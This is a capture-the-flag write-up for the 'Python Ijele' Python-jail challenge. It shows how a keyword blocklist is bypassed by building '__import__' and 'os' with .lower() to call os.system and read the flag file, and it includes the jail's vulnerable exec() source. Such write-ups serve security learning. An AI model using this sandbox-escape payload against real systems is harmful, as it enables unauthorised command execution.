# Python Ijele

**Author**: S|{oto

**CTF**:  UMass Amherst CTF 2022

**Description**: 

*By Thomas C.* 

*Google translate broke when I was making the instructions for this python jail.*

`nc 34.148.103.218 1227` 							 						 					

**Hints**: n/a

After running `nc 34.148.103.218 1227`, we're immediately greeted with: 

```
wewe have aqhephukile benim bahasa codice. Unesi la palabra sapi in Pelekania
>>>
```

As the description of the problem implies, we can use Google Translate to understand this message.  Putting the whole message into Google Translate doesn't yield anything, since the prompt is in multiple different languages.  To fix this, simply translate each word individually.  This gives the sentence `you have cracked my language code. Enter the word cow in English`.  

After you input `cow`, the following text appears:

```
Break out of this simple python jail! You are not allowed to use the words eval, exec, import, open, os, read, system, or write.
>>>
```

Some simple testing will show that, indeed, trying to run any of the listed commands fails and disconnects you from the server.  Additionally, even if your input is acceptable, you can only run one command before you are disconnected from the server.  Thus, any solution we find must print the flag using one command.

First, we need to understand the filesystem that we're within, so that we can hopefully find a file containing the flag.  By default, python contains a dictionary of built-in commands which we can access using `__builtitns__.__dict__[functionname]`.  However, if `functionname` is any of the disallowed words, the jail will recognize that and stop us.  Luckily, since `functionname` is just a string argument here, we can evade the jail's detection by replacing `functionname` with `'FUNCTIONNAME'.lower()`.  Using this principle, we can chain together a series of such statements to create this: 

```python
Break out of this simple python jail! You are not allowed to use the words eval, exec, import, open, os, read, system, or write.
>>> print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['LISTDIR'.lower()]('.')
```

The above input accesses the `import` command and gives it the argument `os` to import the os module.  Then, it runs the method `listdir('.')`, from the `os` module, which returns a list of the files in the current directory.  Finally, the print statement outputs this list to the command line.  As a result, we get the following output:

`['.bashrc', '.bash_logout', '.profile', 'ynetd', 'Dockerfile', 'flag', 'ijele.py']`

So, we have found our flag!  Now we just have to read the contents of it.  To do this, let's alter our previous command.  We're still going to use the `os` module, but this time we'll use the method `system`, which takes UNIX commands as an argument and runs them.  In this case, we want to run `os.system('cat ./flag')` to print out the contents of the `flag` file.  Thus, we craft the following input:

`__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat "./flag"')`

Using this, the flag is printed for us: `UMASS{congrats-now-you-are-multilingual}`



For clarity, here is the full text of the two connections used to get the flag.

```python
$ nc 34.148.103.218 1227
wewe have aqhephukile benim bahasa codice. Unesi la palabra sapi in Pelekania
>>> cow
Break out of this simple python jail! You are not allowed to use the words eval, exec, import, open, os, read, system, or write.
>>> print(__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['LISTDIR'.lower()]('.'))
['.bashrc', '.bash_logout', '.profile', 'ynetd', 'Dockerfile', 'flag', 'ijele.py']

$ nc 34.148.103.218 1227
wewe have aqhephukile benim bahasa codice. Unesi la palabra sapi in Pelekania
>>> cow
Break out of this simple python jail! You are not allowed to use the words eval, exec, import, open, os, read, system, or write.
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat "./flag"')
UMASS{congrats-now-you-are-multilingual}
```

If, for learning purposes, you want to see the exact jail code that you're evading, you can use the following slightly modified version of the flag-printing input.

```python
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat "./ijele.py"')
def main():
    print('wewe have aqhephukile benim bahasa codice. Unesi la palabra sapi in Pelekania')
    code = input('>>> ')
    if code.lower() == 'cow':
        print('Break out of this simple python jail! You are not allowed to use the words eval, exec, import, open, os, read, system, or write.')
        text = input('>>> ')
        for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
            if keyword in text:
                print('Play by the rules!!! Try again.')
                return
        exec(text)
    else:
        print('Wrong code to break out. Sorry, try again!')
```

